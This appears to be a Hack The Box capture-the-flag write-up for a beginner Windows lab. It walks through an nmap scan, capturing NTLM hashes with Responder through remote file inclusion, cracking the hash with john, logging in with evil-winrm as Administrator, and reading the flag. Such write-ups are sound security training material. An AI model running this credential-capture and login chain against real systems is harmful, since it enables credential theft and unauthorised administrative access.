# Overview
**Difficulty:** Very Easy  
**Skills:** RFI, responder, ntlm-relay, password cracking, winrm  
**HTB Link:** https://app.hackthebox.com/starting-point  
**Summary:** Capture NTLM via LLMNR/NetBIOS poisoning and RFI, crack NTLM hash, log to WinRM to obtain admin shell.

---

# Steps

## 1. Reconnaissance
### Nmap scan
- [nmap scan](./evidences/nmap.txt)  
- `nmap -sV unika.htb -oN nmap.txt`  
- Apache web server on port `80/tcp`  
- WinRM server on port `5985/tcp`

---

## 2. Resource Development
### Responder tool
- [NTLM hash](./evidences/ntlm_hash.png)  
- `responder -I tun0`  
- Listening for LLMNR/NetBIOS name resolution requests, to capture NTLM challenge hash (username:MD4 hash of password).

---

## 3. Initial Access
### Remote File Intrusion (RFI)
- [RFI command](./evidences/remote_file_intrusion.png)
- triggers the LLMNR/NetBIOS Name Resolution Request.  
- We get from responder the [NTLM hash](./evidences/hash.txt)

### Hash Crack
- [NTLM hash cracked](./evidences/hash_cracking.png)  
- `john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt`

### WinRM Access
- [WinRM shell access](./evidences/WinRM_access.png)  
- `evil-winrm -i unika.htb -u Administrator -p badminton`

---

## 4. Privilege Escalation
- [root flag](./evidences/root_flag.png)  
- `cat C:\Users\mike\Desktop\flag.txt`
